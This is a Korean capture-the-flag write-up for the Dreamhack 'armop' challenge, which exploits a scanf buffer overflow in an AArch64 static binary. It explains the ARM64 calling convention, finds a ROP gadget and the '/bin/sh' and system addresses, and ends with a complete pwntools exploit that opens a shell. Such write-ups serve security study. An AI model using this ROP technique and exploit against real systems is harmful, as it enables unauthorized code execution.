# armop



[문제링크](https://dreamhack.io/wargame/challenges/1669)



## 문제 분석

```sh
$ checksec ./prob
[*] '/home/user/dreamhack/wargame/armop/deploy/prob'
    Arch:       aarch64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```



```c
// aarch64-linux-gnu-gcc -O1 -fno-stack-protector -fno-pie -o prob prob.c -static
#include <stdio.h>

void run()
{
    char input[0x10];
    printf("input: ");
    scanf("%s", input);
}

int main()
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    system("echo 'exploit aarch64!\n'");
    run();
}
```

- **Canary found**: 스택 카나리가 존재하여 단순한 리턴 주소 덮어쓰기가 어렵다.
- **NX enabled**: 스택에서의 쉘코드 실행이 불가능하다.
- **No PIE**: 바이너리의 베이스 주소가 고정되어 있어, 함수 주소를 직접 사용할 수 있다.

다음 문제를 보면 **AArch64 (ARM 64비트)** 에서 컴파일된 코드에서 취약점을 찾는 문제이다.



## 취약점 분석



```c
void run()
{
    char input[0x10];      // 버퍼: 16바이트
    printf("input: ");
    scanf("%s", input);    // 입력 제한 없음 → BOF!
}
```

 `run()` 함수에서 `char input[0x10]` (16바이트) 버퍼에 대해 `scanf("%s", input)`를 사용하여 입력 길이 제한 없이 데이터를 받고 있다. 이는 전형적인 **Buffer Overflow (BoF)** 취약점이다.



## aarch64 스택 구조 이해

###  레지스터 구조

AARCH64는 **X0 ~ X31**까지 총 32개의 64비트(8바이트) 레지스터를 사용한다.

| 레지스터     | 기능                                               |
| ------------ | -------------------------------------------------- |
| **X0 ~ X7**  | 함수 인자 전달 (1~8번째 인자)                      |
| **X29 (FP)** | 프레임 포인터 (x86-64의 rbp와 유사)                |
| **X30 (LR)** | 링크 레지스터, 함수 종료 후 복귀 주소 저장         |
| **X31 (SP)** | 스택 포인터 (x86-64의 rsp와 유사)                  |
| **PC**       | 현재 실행 중인 명령어의 주소 (x86-64의 rip와 유사) |



### 함수 호출 규약 (Calling Convention)

AARCH64에서는 함수 호출 시 다음 규약을 따른다.

1. **인자 전달**: 첫 8개의 인자는 **X0, X1, ..., X7** 레지스터에 저장
2. **반환값**: **X0** 레지스터에 저장
3. **반환 주소**: **X30** 레지스터에 저장



### 함수 프롤로그/에필로그

```asm
; 함수 시작
stp x29, x30, [sp, #-0x20]!   ; x29, x30를 스택에 저장하고 SP 감소
mov x29, sp                    ; 프레임 포인터 설정

; 함수 종료
ldp x29, x30, [sp], #0x20     ; 스택에서 x29, x30 복원하고 SP 증가
ret                            ; PC를 X30 값으로 변경 (주의: 스택 pop이 아님!)
```

> aarch64의 `ret` 명령어는 스택에서 주소를 pop 하는 것이 아니라, **PC를 X30 레지스터의 값으로 변경**한다.



## 취약점 분석 및 익스플로잇 전략

### 스택 오버플로우 확인

디버깅을 통해 aaaaaaaaaaaaaaaabbbbbbbbcccccccc를 입력 후 레지스터 상태를 확인하면 다음과 같다.

```
X29 = 0x6262626262626262  ('bbbbbbbb')
X30 = 0x6363636363636363  ('cccccccc')
```

즉, **input[16] + saved_x29[8] + saved_x30[8] = 24바이트**를 덮어쓸 수 있으며, 이를 통해 실행 흐름을 조작할 수 있다.



### 필요한 데이터 찾기

`system()` 함수를 호출하여 쉘을 획득하려면:

1. **X0 레지스터**에 `"/bin/sh"` 문자열의 주소를 넣어야 한다.
2. **PC**를 쉘을 실행할 수 있는 함수의 주소로 이동시켜야 한다.
   -  IDA를 통해 살펴보면 0x401630에 `do_system` 이라고 system함수가 있다.

```
# /bin/sh 문자열 주소 확인
$ strings -tx ./prob | grep "/bin/sh"
  4671c8 /bin/sh

# ROP 가젯 검색
$ ROPgadget --binary ./prob | grep "ldr x0"
0x0000000000435e38 : ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret
```

0x0000000000435e38 가젯은 다음과 같이 동작한다.

1. `ldr x0, [sp, #0x60]` → **X0에 [SP+0x60] 주소의 값을 로드**
2. `ldp x29, x30, [sp], #0x80` → 스택에서 x29, x30를 팝하고 SP += 0x80
3. `ret` → PC를 X30로 변경

## 페이로드 구성

###  페이로드 레이아웃

| **오프셋**        | **내용**                   | **설명**                                       |
| ----------------- | -------------------------- | ---------------------------------------------- |
| **`0x00 ~ 0x0F`** | `a * 16`                   | `input[16]` 버퍼 채우기                        |
| **`0x10 ~ 0x17`** | `b * 8`                    | `saved x29` 덮어쓰기                           |
| **`0x18 ~ 0x1F`** | **`gadget`** `(0x435e38)`  | `saved x30` → 가젯으로 점프                    |
| **`0x20 ~ 0x27`** | `X * 8`                    | **`[SP]`** `ldp x29`로 들어갈 더미             |
| **`0x28 ~ 0x2F`** | **`system`** `(0x401630)`  | **`[SP+0x08]`** `ldp x30` → `do_system` 이동   |
| **`0x30 ~ 0x7F`** | `X * 80`                   | **패딩 (80바이트)**                            |
| **`0x80 ~ 0x87`** | **`/bin/sh`** `(0x4671c8)` | **`[SP+0x60]`** `ldr x0`가 읽을 값 → `X0` 세팅 |



### 실행 흐름

```plain
1. run() 함수 종료
   → ldp x29, x30, [sp], #0x20
   → x30 = 0x435e38 (가젯 주소)
   → ret → PC = 0x435e38

2. 가젯 (0x435e38) 실행
   → ldr x0, [sp, #0x60]      ; x0 = [sp+0x60] = 0x4671c8 ("/bin/sh")
   → ldp x29, x30, [sp], #0x80 ; x30 = 0x401630 (system)
   → ret → PC = 0x401630 (do_system)

3. system("/bin/sh") 실행 → 쉘 획득!
```

------

## 익스플로잇 코드

```python
from pwn import *
import sys

context.arch = "aarch64"
context.os = "linux"

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./prob')

gadget = 0x435e38       # ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret
system = 0x401630       # do_system
binsh = 0x4671c8        # 문자열 "/bin/sh" 주소

# 페이로드 구성
payload = b'a' * 24
payload += p64(gadget) 
payload += b'a' * 8
payload += p64(system)
payload += b'X' * 80     
payload += p64(binsh)

# 페이로드 전송
p.sendlineafter(b'input: ', payload)
p.interactive()
```

